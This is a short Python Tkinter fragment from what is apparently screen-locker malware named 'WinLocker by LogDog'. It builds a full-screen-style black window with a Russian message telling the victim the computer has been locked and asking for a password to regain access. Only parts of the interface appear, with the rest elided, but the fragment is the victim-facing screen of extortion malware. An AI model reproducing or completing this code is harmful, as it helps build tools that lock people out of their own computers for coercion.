...
window = Tk()
window.title("WinLocker by LogDog")
...
txt_one = Label(window, text='WinLocker by LogDog', font=("Arial Bold", fontsizeHding), fg='lightgreen', bg='black')
txt_three = Label(window, text='Ваш компьютер был заблокирован WinLocker. Пожалуйста, введите пароль для получения доступа к компьютеру:', font=("Arial Bold", fontsize), fg='white', bg='black')
